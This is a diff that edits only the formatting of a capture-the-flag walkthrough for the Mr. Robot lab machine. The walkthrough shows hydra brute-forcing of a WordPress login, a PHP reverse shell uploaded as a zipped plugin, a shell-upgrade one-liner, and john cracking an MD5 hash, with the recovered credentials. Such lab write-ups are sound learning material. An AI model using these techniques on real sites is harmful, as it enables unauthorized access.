@@ -24,36 +24,36 @@ This is how looked a command for bruteforcing a username:<br>
 `hydra -L fsocity.dic -p test 10.0.4.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1:Invalid username" -V`
 > [80][http-post-form] host: 10.0.4.5   login: Elliot   password: test
 
-Now I need to bruteforce the password. But first we need to remove dublications from the file since there is a lot of them.
+Now I need to bruteforce the password. But first we need to remove dublications from the file since there is a lot of them.<br>
 `sort fsocity.dic | uniq > new_fsocity.dic`
 
 You can check the lenght of the file before and after using this command:
 `wc -l`
 
-Then run password bruteforcing.
-`hydra -l Elliot -P n_fsocity.dic 10.0.4.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1:The password you entered" -V`
+Then run password bruteforcing.<br>
+`hydra -l Elliot -P n_fsocity.dic 10.0.4.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1:The password you entered" -V`
 
-Username: _Elliot_<br>
+Username: _Elliot_ <br>
 Password: _ER28-0652_
 
-Looks like I can upload my own plugins, so I found a simple php reverse-shell, and zipped it, so wordpress thinks it is a plugin.
+Looks like I can upload my own plugins, so I found a simple php reverse-shell, and zipped it, so wordpress thinks it is a plugin.<br>
 `zip rev-plug.zip ./shell.php`
 
 Upload the plugin, set up a nc listener, and activate the plugin. Now we have a reverse-shell.
-Use this command to upgrade the shell:
+Use this command to upgrade the shell:<br>
 `python -c 'import pty; pty.spawn("/bin/bash")'`
 
 We can see that there is a user named robot. Go to his folder and we will find:
 > key-2-of-3.txt - Second key for ctfers<br>
 > password.raw-md5
 
-This is what I have found in password.raw-md5
-robot:c3fcd3d76192e4007dfb496cca67e13b
+This is what I have found in password.raw-md5<br>
+> robot:c3fcd3d76192e4007dfb496cca67e13b
 
 Let's crack the hash.
 `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt robot_hash.txt`
-username: robot
-password: abcdefghijklmnopqrstuvwxyz
+username: _robot_ <br>
+password: _abcdefghijklmnopqrstuvwxyz_
 
 Change current user to robot.
 
